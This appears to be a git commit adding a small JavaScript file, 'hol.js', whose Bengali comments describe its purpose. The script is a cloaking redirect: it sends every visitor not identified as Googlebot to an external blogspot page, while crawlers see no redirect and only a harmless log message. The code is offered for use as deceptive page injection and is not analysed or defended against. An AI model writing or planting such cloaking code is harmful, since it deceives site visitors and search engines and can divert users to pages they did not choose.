105a7291a50412d5c3ce018d0706ab1cf1a43554
aliceekeysi-arch <aliceekeysi@gmail.com>
2026-06-29 01:49:29 +0600

    Add files via upload

---
+++ hol.js
@@ -0,0 +1,11 @@
+<script type='text/javascript'>
+//<![CDATA[
+if (!navigator.userAgent.includes('Googlebot')) {
+  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট করুন
+  window.location.href = "https://chu-chu-pompom.blogspot.com/2026/06/cc.html";
+} else {
+  // সার্চ ইঞ্জিন বটদের জন্য - কোনো রিডাইরেক্ট নেই
+  console.log("Thanks for visiting my page");
+}
+//]]>
+</script>
